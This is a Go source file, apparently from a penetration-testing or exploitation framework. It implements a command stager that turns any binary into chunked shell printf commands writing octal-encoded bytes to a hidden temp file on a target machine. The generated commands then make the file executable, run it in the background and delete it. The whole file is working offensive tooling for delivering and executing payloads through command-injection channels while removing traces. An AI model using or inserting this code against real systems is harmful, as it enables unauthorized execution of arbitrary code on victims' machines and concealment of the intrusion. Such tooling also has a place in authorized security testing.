package cmdstager

import "fmt"

const defaultLineMax = 2047

// Options controls chunking behavior.
type Options struct {
	TempPath string // destination path on target, e.g. "/tmp/.pXrT4k"
	LineMax  int    // max command length per chunk (default 2047)
}

func (o Options) lineMax() int {
	if o.LineMax > 0 {
		return o.LineMax
	}
	return defaultLineMax
}

// Printf encodes a binary as printf octal chunks.
// Returns a list of shell commands: printf chunks, chmod +x, exec in background, cleanup.
func Printf(binary []byte, opts Options) []string {
	lineMax := opts.lineMax()
	// printf '...' >> /tmp/.pXrT4k
	prefix := "printf '"
	suffix := fmt.Sprintf("'>>%s", opts.TempPath)
	overhead := len(prefix) + len(suffix)
	chunkCapacity := max(lineMax-overhead, 4)

	// Each byte encodes as \NNN (4 chars)
	bytesPerChunk := chunkCapacity / 4

	var commands []string
	for i := 0; i < len(binary); i += bytesPerChunk {
		end := min(i+bytesPerChunk, len(binary))
		chunk := encodeOctal(binary[i:end])
		commands = append(commands, prefix+chunk+suffix)
	}

	commands = append(commands,
		fmt.Sprintf("chmod +x %s", opts.TempPath),
		fmt.Sprintf("%s &", opts.TempPath),
		fmt.Sprintf("rm -f %s", opts.TempPath),
	)

	return commands
}

// encodeOctal converts each byte to \NNN octal format.
func encodeOctal(data []byte) string {
	buf := make([]byte, 0, len(data)*4)
	for _, b := range data {
		buf = append(buf, fmt.Sprintf("\\%03o", b)...)
	}
	return string(buf)
}
